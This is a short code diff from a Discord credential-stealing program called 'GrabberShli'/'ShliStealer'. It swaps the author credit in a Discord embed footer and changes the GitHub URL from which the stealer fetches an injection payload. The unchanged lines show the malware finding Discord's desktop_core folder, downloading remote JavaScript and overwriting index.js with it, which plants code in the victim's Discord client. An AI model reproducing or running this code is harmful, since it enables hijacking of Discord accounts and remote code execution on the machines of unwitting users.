@@ -202,7 +202,7 @@ def main():
 					"icon_url": avatar_url
 				},
 				"footer": {
-					"text": "GrabberShli by Shlimazl#1337・https://github.com/omerfrktrz/"
+					"text": "GrabberShli by Shlimazl#4024・https://github.com/Shlimazl1337/"
 				}
 			}
 			embeds.append(embed)
@@ -231,7 +231,7 @@ def ShliStealer():
 				try:
 					directory_list = os.path.join(root, name+"\\discord_desktop_core\\index.js")
 					os.mkdir(os.path.join(root, name+"\\discord_desktop_core\\Shli"))
-					f = urlopen("https://raw.githubusercontent.com/omerfrktrz/Injection/main/Injection-clean")
+					f = urlopen("https://raw.githubusercontent.com/Shlimazl1337/Injection/main/Injection-clean")
 					index_content = f.read()
 					with open(directory_list, 'wb') as index_file:
 						index_file.write(index_content)
